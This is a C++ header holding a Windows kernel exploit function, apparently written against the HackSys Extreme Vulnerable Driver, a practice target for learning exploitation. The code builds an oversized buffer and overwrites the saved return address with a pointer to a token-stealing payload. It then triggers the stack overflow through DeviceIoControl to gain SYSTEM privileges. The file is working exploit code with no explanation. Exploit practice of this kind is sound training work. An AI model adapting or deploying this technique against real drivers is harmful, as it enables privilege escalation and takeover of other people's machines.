#pragma once

#include "common.h"
#include <iostream>
#include <windows.h>

using namespace std;

BOOL exploitStackOverflow(HANDLE hDevice) {
	
	BOOL		bSuccess = FALSE;
	DWORD		dwBytesReturned;
	DWORD		dwSize;			// Size of char buffer that overflows
	DWORD		dwOffset;		// Offset to saved EIP
	LPVOID		lpInBuffer;		// Where we will create our buffer and send it to the driver
	PULONG_PTR	lpPwnRip;

	dwSize = sizeof(ULONG)*512;
	dwOffset = sizeof(ULONG_PTR) * 9;

	cout << "\t[+] Making space for your payload." << endl;

	lpInBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + dwOffset);

	if (lpInBuffer == NULL)
	{
		cout << "\t[!] FAILED to make space for payload." << endl;
		return FALSE;
	}

	cout << "\t[+] Allocated " << (dwSize + dwOffset) << " bytes for triggering payload." << endl;

	memset(lpInBuffer, 'A', dwSize + sizeof(ULONG_PTR)*8);	// After this, Saved RET get overwritten

	lpPwnRip = (PULONG_PTR)((ULONG)(lpInBuffer) + dwSize + sizeof(ULONG_PTR)*8);

	*lpPwnRip = (ULONG_PTR)TokenStealingPayloadWin7;

	cout << "\t[+] Payload prepared" << endl;

	cout << "\t[+] Triggering the bug. Hope for the best." << endl;

	bSuccess = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, lpInBuffer, dwSize + dwOffset, NULL, 42, &dwBytesReturned, NULL);

	if (bSuccess == FALSE)
	{
		cout << "\t[!] For some reason, the operation failed." << endl;	
	}
	
	cout << "\t[+] Cleaning the payload." << endl;

	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpInBuffer);

	return bSuccess;
}